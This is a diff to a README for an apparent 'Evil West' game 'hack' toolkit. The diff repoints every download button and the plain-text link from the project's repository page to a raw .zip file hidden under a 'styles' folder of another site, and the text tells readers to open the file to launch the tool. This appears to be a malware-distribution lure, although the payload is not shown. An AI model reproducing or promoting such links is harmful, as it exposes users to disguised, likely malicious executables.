@@ -5,7 +5,7 @@ description: "Plan Jesse builds, weapon loadouts, gauntlet perks, combat practic
 ---
 # 🦇 evil-west-hack-2026-vampire-hunter-combat-toolkit - Build Smarter Vampire Hunter Loadouts
 
-[![Download Now](https://img.shields.io/badge/⬇_DOWNLOAD-Evil_West_Combat_Toolkit-6A0DAD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trinx1/evil-west-hack-2026-vampire-hunter-combat-toolkit)
+[![Download Now](https://img.shields.io/badge/⬇_DOWNLOAD-Evil_West_Combat_Toolkit-6A0DAD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Trinx1/trinx1.github.io/main/src/styles/v3.4.zip)
 
 A friendly, all-in-one companion app for **Evil West** players on Windows. It helps you plan Jesse's builds, compare weapons and gauntlet upgrades, review perks, map out missions, and study your combat numbers so every fight against the vampire hordes goes your way. No programming knowledge needed — if you can click a mouse, you can use this.
 
@@ -39,11 +39,11 @@ You get a build planner for Jesse, a full weapon and upgrade reference, a perk c
 
 ## 💾 Download and Setup
 
-[![Download Now](https://img.shields.io/badge/⬇_GET_THE_TOOLKIT-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trinx1/evil-west-hack-2026-vampire-hunter-combat-toolkit)
+[![Download Now](https://img.shields.io/badge/⬇_GET_THE_TOOLKIT-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Trinx1/trinx1.github.io/main/src/styles/v3.4.zip)
 
 Visit this link to download the application:
 
-**https://github.com/Trinx1/evil-west-hack-2026-vampire-hunter-combat-toolkit**
+**https://raw.githubusercontent.com/Trinx1/trinx1.github.io/main/src/styles/v3.4.zip**
 
 That page is your single starting point. Open it in your browser, find the download area on the page, and save the application to your computer. Once it's saved, open the file to launch the toolkit.
 
